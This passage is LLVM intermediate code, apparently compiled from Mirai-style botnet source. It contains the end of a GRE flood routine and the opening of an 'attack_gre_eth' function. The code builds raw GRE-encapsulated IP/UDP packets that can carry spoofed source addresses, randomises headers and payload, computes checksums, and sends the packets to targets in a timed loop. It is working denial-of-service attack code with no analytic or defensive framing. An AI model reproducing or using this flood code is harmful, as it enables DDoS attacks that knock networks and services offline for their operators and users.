  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i32, align 4
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca %struct.iphdr*, align 8
  %26 = alloca %struct.grehdr*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.udphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca %struct.iphdr*, align 8
  %31 = alloca %struct.grehdr*, align 8
  %32 = alloca %struct.iphdr*, align 8
  %33 = alloca %struct.udphdr*, align 8
  %34 = alloca i8*, align 8
  %35 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %36 = load i8, i8* %7, align 1
  %37 = zext i8 %36 to i64
  %38 = call noalias i8* @calloc(i64 %37, i64 8) #6
  %39 = bitcast i8* %38 to i8**
  store i8** %39, i8*** %13, align 8
  %40 = load i8, i8* %9, align 1
  %41 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %42 = call i32 @attack_get_opt_int(i8 zeroext %40, %struct.attack_option* %41, i8 zeroext 2, i32 0)
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %14, align 1
  %44 = load i8, i8* %9, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %46 = call i32 @attack_get_opt_int(i8 zeroext %44, %struct.attack_option* %45, i8 zeroext 3, i32 65535)
  %47 = trunc i32 %46 to i16
  store i16 %47, i16* %15, align 2
  %48 = load i8, i8* %9, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 4, i32 64)
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %16, align 1
  %52 = load i8, i8* %9, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 5, i32 1)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %17, align 1
  %56 = load i8, i8* %9, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 6, i32 65535)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %18, align 2
  %60 = load i8, i8* %9, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 7, i32 65535)
  %63 = trunc i32 %62 to i16
  store i16 %63, i16* %19, align 2
  %64 = load i8, i8* %9, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 0, i32 512)
  store i32 %66, i32* %20, align 4
  %67 = load i8, i8* %9, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %69 = call i32 @attack_get_opt_int(i8 zeroext %67, %struct.attack_option* %68, i8 zeroext 1, i32 1)
  %70 = trunc i32 %69 to i8
  store i8 %70, i8* %21, align 1
  %71 = load i8, i8* %9, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 18, i32 0)
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %22, align 1
  %75 = load i8, i8* %9, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %77 = load i32, i32* @LOCAL_ADDR, align 4
  %78 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 19, i32 %77)
  store i32 %78, i32* %23, align 4
  %79 = call i64 @time(i64* null) #6
  %80 = load i32, i32* %6, align 4
  %81 = sext i32 %80 to i64
  %82 = add nsw i64 %79, %81
  %83 = trunc i64 %82 to i32
  store i32 %83, i32* %24, align 4
  %84 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %84, i32* %12, align 4
  %85 = icmp eq i32 %84, -1
  br i1 %85, label %86, label %87

; <label>:86:                                     ; preds = %5
  br label %451

; <label>:87:                                     ; preds = %5
  store i32 1, i32* %11, align 4
  %88 = load i32, i32* %12, align 4
  %89 = bitcast i32* %11 to i8*
  %90 = call i32 @setsockopt(i32 %88, i32 0, i32 3, i8* %89, i32 4) #6
  %91 = icmp eq i32 %90, -1
  br i1 %91, label %92, label %95

; <label>:92:                                     ; preds = %87
  %93 = load i32, i32* %12, align 4
  %94 = call i32 @close(i32 %93)
  br label %451

; <label>:95:                                     ; preds = %87
  store i32 0, i32* %11, align 4
  br label %96

; <label>:96:                                     ; preds = %246, %95
  %97 = load i32, i32* %11, align 4
  %98 = load i8, i8* %7, align 1
  %99 = zext i8 %98 to i32
  %100 = icmp slt i32 %97, %99
  br i1 %100, label %101, label %249

; <label>:101:                                    ; preds = %96
  %102 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %103 = load i8**, i8*** %13, align 8
  %104 = load i32, i32* %11, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds i8*, i8** %103, i64 %105
  store i8* %102, i8** %106, align 8
  %107 = load i8**, i8*** %13, align 8
  %108 = load i32, i32* %11, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds i8*, i8** %107, i64 %109
  %111 = load i8*, i8** %110, align 8
  %112 = bitcast i8* %111 to %struct.iphdr*
  store %struct.iphdr* %112, %struct.iphdr** %25, align 8
  %113 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %114 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %113, i64 1
  %115 = bitcast %struct.iphdr* %114 to %struct.grehdr*
  store %struct.grehdr* %115, %struct.grehdr** %26, align 8
  %116 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %117 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %116, i64 1
  %118 = bitcast %struct.grehdr* %117 to %struct.iphdr*
  store %struct.iphdr* %118, %struct.iphdr** %27, align 8
  %119 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %120 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %119, i64 1
  %121 = bitcast %struct.iphdr* %120 to %struct.udphdr*
  store %struct.udphdr* %121, %struct.udphdr** %28, align 8
  %122 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %123 = bitcast %struct.iphdr* %122 to i8*
  %124 = load i8, i8* %123, align 4
  %125 = and i8 %124, 15
  %126 = or i8 %125, 64
  store i8 %126, i8* %123, align 4
  %127 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %128 = bitcast %struct.iphdr* %127 to i8*
  %129 = load i8, i8* %128, align 4
  %130 = and i8 %129, -16
  %131 = or i8 %130, 5
  store i8 %131, i8* %128, align 4
  %132 = load i8, i8* %14, align 1
  %133 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %134 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %133, i32 0, i32 1
  store i8 %132, i8* %134, align 1
  %135 = load i32, i32* %20, align 4
  %136 = sext i32 %135 to i64
  %137 = add i64 52, %136
  %138 = trunc i64 %137 to i16
  %139 = call zeroext i16 @htons(i16 zeroext %138) #7
  %140 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %141 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %140, i32 0, i32 2
  store i16 %139, i16* %141, align 2
  %142 = load i16, i16* %15, align 2
  %143 = call zeroext i16 @htons(i16 zeroext %142) #7
  %144 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %145 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %144, i32 0, i32 3
  store i16 %143, i16* %145, align 4
  %146 = load i8, i8* %16, align 1
  %147 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %148 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %147, i32 0, i32 5
  store i8 %146, i8* %148, align 4
  %149 = load i8, i8* %17, align 1
  %150 = icmp ne i8 %149, 0
  br i1 %150, label %151, label %155

; <label>:151:                                    ; preds = %101
  %152 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %153 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %154 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %153, i32 0, i32 4
  store i16 %152, i16* %154, align 2
  br label %155

; <label>:155:                                    ; preds = %151, %101
  %156 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %157 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %156, i32 0, i32 6
  store i8 47, i8* %157, align 1
  %158 = load i32, i32* %23, align 4
  %159 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %160 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %159, i32 0, i32 8
  store i32 %158, i32* %160, align 4
  %161 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %162 = load i32, i32* %11, align 4
  %163 = sext i32 %162 to i64
  %164 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %161, i64 %163
  %165 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %164, i32 0, i32 1
  %166 = load i32, i32* %165, align 4
  %167 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %168 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %167, i32 0, i32 9
  store i32 %166, i32* %168, align 4
  %169 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %170 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %171 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %170, i32 0, i32 1
  store i16 %169, i16* %171, align 2
  %172 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %173 = bitcast %struct.iphdr* %172 to i8*
  %174 = load i8, i8* %173, align 4
  %175 = and i8 %174, 15
  %176 = or i8 %175, 64
  store i8 %176, i8* %173, align 4
  %177 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %178 = bitcast %struct.iphdr* %177 to i8*
  %179 = load i8, i8* %178, align 4
  %180 = and i8 %179, -16
  %181 = or i8 %180, 5
  store i8 %181, i8* %178, align 4
  %182 = load i8, i8* %14, align 1
  %183 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %184 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %183, i32 0, i32 1
  store i8 %182, i8* %184, align 1
  %185 = load i32, i32* %20, align 4
  %186 = sext i32 %185 to i64
  %187 = add i64 28, %186
  %188 = trunc i64 %187 to i16
  %189 = call zeroext i16 @htons(i16 zeroext %188) #7
  %190 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %191 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %190, i32 0, i32 2
  store i16 %189, i16* %191, align 2
  %192 = load i16, i16* %15, align 2
  %193 = zext i16 %192 to i32
  %194 = xor i32 %193, -1
  %195 = trunc i32 %194 to i16
  %196 = call zeroext i16 @htons(i16 zeroext %195) #7
  %197 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %198 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %197, i32 0, i32 3
  store i16 %196, i16* %198, align 4
  %199 = load i8, i8* %16, align 1
  %200 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %201 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %200, i32 0, i32 5
  store i8 %199, i8* %201, align 4
  %202 = load i8, i8* %17, align 1
  %203 = icmp ne i8 %202, 0
  br i1 %203, label %204, label %208

; <label>:204:                                    ; preds = %155
  %205 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %206 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %207 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %206, i32 0, i32 4
  store i16 %205, i16* %207, align 2
  br label %208

; <label>:208:                                    ; preds = %204, %155
  %209 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %210 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %209, i32 0, i32 6
  store i8 17, i8* %210, align 1
  %211 = call i32 @rand_next()
  %212 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %213 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %212, i32 0, i32 8
  store i32 %211, i32* %213, align 4
  %214 = load i8, i8* %22, align 1
  %215 = icmp ne i8 %214, 0
  br i1 %215, label %216, label %222

; <label>:216:                                    ; preds = %208
  %217 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %218 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %217, i32 0, i32 9
  %219 = load i32, i32* %218, align 4
  %220 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %221 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %220, i32 0, i32 9
  store i32 %219, i32* %221, align 4
  br label %230

; <label>:222:                                    ; preds = %208
  %223 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %224 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %223, i32 0, i32 8
  %225 = load i32, i32* %224, align 4
  %226 = sub i32 %225, 1024
  %227 = xor i32 %226, -1
  %228 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %229 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %228, i32 0, i32 9
  store i32 %227, i32* %229, align 4
  br label %230

; <label>:230:                                    ; preds = %222, %216
  %231 = load i16, i16* %18, align 2
  %232 = call zeroext i16 @htons(i16 zeroext %231) #7
  %233 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %234 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %233, i32 0, i32 0
  store i16 %232, i16* %234, align 2
  %235 = load i16, i16* %19, align 2
  %236 = call zeroext i16 @htons(i16 zeroext %235) #7
  %237 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %238 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %237, i32 0, i32 1
  store i16 %236, i16* %238, align 2
  %239 = load i32, i32* %20, align 4
  %240 = sext i32 %239 to i64
  %241 = add i64 8, %240
  %242 = trunc i64 %241 to i16
  %243 = call zeroext i16 @htons(i16 zeroext %242) #7
  %244 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %245 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %244, i32 0, i32 2
  store i16 %243, i16* %245, align 2
  br label %246

; <label>:246:                                    ; preds = %230
  %247 = load i32, i32* %11, align 4
  %248 = add nsw i32 %247, 1
  store i32 %248, i32* %11, align 4
  br label %96

; <label>:249:                                    ; preds = %96
  br label %250

; <label>:250:                                    ; preds = %450, %249
  store i32 0, i32* %11, align 4
  br label %251

; <label>:251:                                    ; preds = %441, %250
  %252 = load i32, i32* %11, align 4
  %253 = load i8, i8* %7, align 1
  %254 = zext i8 %253 to i32
  %255 = icmp slt i32 %252, %254
  br i1 %255, label %256, label %444

; <label>:256:                                    ; preds = %251
  %257 = load i8**, i8*** %13, align 8
  %258 = load i32, i32* %11, align 4
  %259 = sext i32 %258 to i64
  %260 = getelementptr inbounds i8*, i8** %257, i64 %259
  %261 = load i8*, i8** %260, align 8
  store i8* %261, i8** %29, align 8
  %262 = load i8*, i8** %29, align 8
  %263 = bitcast i8* %262 to %struct.iphdr*
  store %struct.iphdr* %263, %struct.iphdr** %30, align 8
  %264 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %265 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %264, i64 1
  %266 = bitcast %struct.iphdr* %265 to %struct.grehdr*
  store %struct.grehdr* %266, %struct.grehdr** %31, align 8
  %267 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %268 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %267, i64 1
  %269 = bitcast %struct.grehdr* %268 to %struct.iphdr*
  store %struct.iphdr* %269, %struct.iphdr** %32, align 8
  %270 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %271 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %270, i64 1
  %272 = bitcast %struct.iphdr* %271 to %struct.udphdr*
  store %struct.udphdr* %272, %struct.udphdr** %33, align 8
  %273 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %274 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %273, i64 1
  %275 = bitcast %struct.udphdr* %274 to i8*
  store i8* %275, i8** %34, align 8
  %276 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %277 = load i32, i32* %11, align 4
  %278 = sext i32 %277 to i64
  %279 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %276, i64 %278
  %280 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %279, i32 0, i32 2
  %281 = load i8, i8* %280, align 4
  %282 = zext i8 %281 to i32
  %283 = icmp slt i32 %282, 32
  br i1 %283, label %284, label %305

; <label>:284:                                    ; preds = %256
  %285 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %286 = load i32, i32* %11, align 4
  %287 = sext i32 %286 to i64
  %288 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %285, i64 %287
  %289 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %288, i32 0, i32 1
  %290 = load i32, i32* %289, align 4
  %291 = call i32 @ntohl(i32 %290) #7
  %292 = call i32 @rand_next()
  %293 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %294 = load i32, i32* %11, align 4
  %295 = sext i32 %294 to i64
  %296 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %293, i64 %295
  %297 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %296, i32 0, i32 2
  %298 = load i8, i8* %297, align 4
  %299 = zext i8 %298 to i32
  %300 = lshr i32 %292, %299
  %301 = add i32 %291, %300
  %302 = call i32 @htonl(i32 %301) #7
  %303 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %304 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %303, i32 0, i32 9
  store i32 %302, i32* %304, align 4
  br label %305

; <label>:305:                                    ; preds = %284, %256
  %306 = load i32, i32* %23, align 4
  %307 = icmp eq i32 %306, -1
  br i1 %307, label %308, label %312

; <label>:308:                                    ; preds = %305
  %309 = call i32 @rand_next()
  %310 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %311 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %310, i32 0, i32 8
  store i32 %309, i32* %311, align 4
  br label %312

; <label>:312:                                    ; preds = %308, %305
  %313 = load i16, i16* %15, align 2
  %314 = zext i16 %313 to i32
  %315 = icmp eq i32 %314, 65535
  br i1 %315, label %316, label %331

; <label>:316:                                    ; preds = %312
  %317 = call i32 @rand_next()
  %318 = and i32 %317, 65535
  %319 = trunc i32 %318 to i16
  %320 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %321 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %320, i32 0, i32 3
  store i16 %319, i16* %321, align 4
  %322 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %323 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %322, i32 0, i32 3
  %324 = load i16, i16* %323, align 4
  %325 = zext i16 %324 to i32
  %326 = sub nsw i32 %325, 1000
  %327 = xor i32 %326, -1
  %328 = trunc i32 %327 to i16
  %329 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %330 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %329, i32 0, i32 3
  store i16 %328, i16* %330, align 4
  br label %331

; <label>:331:                                    ; preds = %316, %312
  %332 = load i16, i16* %18, align 2
  %333 = zext i16 %332 to i32
  %334 = icmp eq i32 %333, 65535
  br i1 %334, label %335, label %341

; <label>:335:                                    ; preds = %331
  %336 = call i32 @rand_next()
  %337 = and i32 %336, 65535
  %338 = trunc i32 %337 to i16
  %339 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %340 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %339, i32 0, i32 0
  store i16 %338, i16* %340, align 2
  br label %341

; <label>:341:                                    ; preds = %335, %331
  %342 = load i16, i16* %19, align 2
  %343 = zext i16 %342 to i32
  %344 = icmp eq i32 %343, 65535
  br i1 %344, label %345, label %351

; <label>:345:                                    ; preds = %341
  %346 = call i32 @rand_next()
  %347 = and i32 %346, 65535
  %348 = trunc i32 %347 to i16
  %349 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %350 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %349, i32 0, i32 1
  store i16 %348, i16* %350, align 2
  br label %351

; <label>:351:                                    ; preds = %345, %341
  %352 = load i8, i8* %22, align 1
  %353 = icmp ne i8 %352, 0
  br i1 %353, label %358, label %354

; <label>:354:                                    ; preds = %351
  %355 = call i32 @rand_next()
  %356 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %357 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %356, i32 0, i32 9
  store i32 %355, i32* %357, align 4
  br label %364

; <label>:358:                                    ; preds = %351
  %359 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %360 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %359, i32 0, i32 9
  %361 = load i32, i32* %360, align 4
  %362 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %363 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %362, i32 0, i32 9
  store i32 %361, i32* %363, align 4
  br label %364

; <label>:364:                                    ; preds = %358, %354
  %365 = load i8, i8* %21, align 1
  %366 = icmp ne i8 %365, 0
  br i1 %366, label %367, label %374

; <label>:367:                                    ; preds = %364
  %368 = load i8*, i8** %34, align 8
  %369 = load i32, i32* %20, align 4
  call void @rand_alpha_str(i8* %368, i32 %369)
  %370 = load i8*, i8** %34, align 8
  %371 = load i32, i32* %20, align 4
  %372 = sext i32 %371 to i64
  %373 = getelementptr inbounds i8, i8* %370, i64 %372
  store i8 0, i8* %373, align 1
  br label %374

; <label>:374:                                    ; preds = %367, %364
  %375 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %376 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %375, i32 0, i32 7
  store i16 0, i16* %376, align 2
  %377 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %378 = bitcast %struct.iphdr* %377 to i16*
  %379 = call zeroext i16 @checksum_generic(i16* %378, i32 20)
  %380 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %381 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %380, i32 0, i32 7
  store i16 %379, i16* %381, align 2
  %382 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %383 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %382, i32 0, i32 7
  store i16 0, i16* %383, align 2
  %384 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %385 = bitcast %struct.iphdr* %384 to i16*
  %386 = call zeroext i16 @checksum_generic(i16* %385, i32 20)
  %387 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %388 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %387, i32 0, i32 7
  store i16 %386, i16* %388, align 2
  %389 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %390 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %389, i32 0, i32 3
  store i16 0, i16* %390, align 2
  %391 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %392 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %393 = bitcast %struct.udphdr* %392 to i8*
  %394 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %395 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %394, i32 0, i32 2
  %396 = load i16, i16* %395, align 2
  %397 = load i32, i32* %20, align 4
  %398 = sext i32 %397 to i64
  %399 = add i64 8, %398
  %400 = trunc i64 %399 to i32
  %401 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %391, i8* %393, i16 zeroext %396, i32 %400)
  %402 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %403 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %402, i32 0, i32 3
  store i16 %401, i16* %403, align 2
  %404 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %405 = load i32, i32* %11, align 4
  %406 = sext i32 %405 to i64
  %407 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %404, i64 %406
  %408 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %407, i32 0, i32 0
  %409 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %408, i32 0, i32 0
  store i16 2, i16* %409, align 4
  %410 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %411 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %410, i32 0, i32 9
  %412 = load i32, i32* %411, align 4
  %413 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %414 = load i32, i32* %11, align 4
  %415 = sext i32 %414 to i64
  %416 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %413, i64 %415
  %417 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %416, i32 0, i32 0
  %418 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %417, i32 0, i32 2
  %419 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %418, i32 0, i32 0
  store i32 %412, i32* %419, align 4
  %420 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %421 = load i32, i32* %11, align 4
  %422 = sext i32 %421 to i64
  %423 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %420, i64 %422
  %424 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %423, i32 0, i32 0
  %425 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %424, i32 0, i32 1
  store i16 0, i16* %425, align 2
  %426 = load i32, i32* %12, align 4
  %427 = load i8*, i8** %29, align 8
  %428 = load i32, i32* %20, align 4
  %429 = sext i32 %428 to i64
  %430 = add i64 52, %429
  %431 = bitcast %union.__CONST_SOCKADDR_ARG* %35 to %struct.sockaddr**
  %432 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %433 = load i32, i32* %11, align 4
  %434 = sext i32 %433 to i64
  %435 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %432, i64 %434
  %436 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %435, i32 0, i32 0
  %437 = bitcast %struct.sockaddr_in* %436 to %struct.sockaddr*
  store %struct.sockaddr* %437, %struct.sockaddr** %431, align 8
  %438 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %35, i32 0, i32 0
  %439 = load %struct.sockaddr*, %struct.sockaddr** %438, align 8
  %440 = call i64 @sendto(i32 %426, i8* %427, i64 %430, i32 16384, %struct.sockaddr* %439, i32 16)
  br label %441

; <label>:441:                                    ; preds = %374
  %442 = load i32, i32* %11, align 4
  %443 = add nsw i32 %442, 1
  store i32 %443, i32* %11, align 4
  br label %251

; <label>:444:                                    ; preds = %251
  %445 = call i64 @time(i64* null) #6
  %446 = load i32, i32* %24, align 4
  %447 = sext i32 %446 to i64
  %448 = icmp sgt i64 %445, %447
  br i1 %448, label %449, label %450

; <label>:449:                                    ; preds = %444
  br label %451

; <label>:450:                                    ; preds = %444
  br label %250

; <label>:451:                                    ; preds = %449, %92, %86
  ret void
}

; Function Attrs: nounwind
declare i64 @time(i64*) #1

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #1

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #1

declare i32 @close(i32) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #2

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #2

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_gre_eth(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i32, align 4
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca %struct.iphdr*, align 8
  %26 = alloca %struct.grehdr*, align 8
  %27 = alloca %struct.ethhdr*, align 8
  %28 = alloca %struct.iphdr*, align 8
  %29 = alloca %struct.udphdr*, align 8
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i8*, align 8
  %34 = alloca %struct.iphdr*, align 8
  %35 = alloca %struct.grehdr*, align 8
  %36 = alloca %struct.ethhdr*, align 8
  %37 = alloca %struct.iphdr*, align 8
  %38 = alloca %struct.udphdr*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca i32, align 4
  %41 = alloca i32, align 4
  %42 = alloca i32, align 4
  %43 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
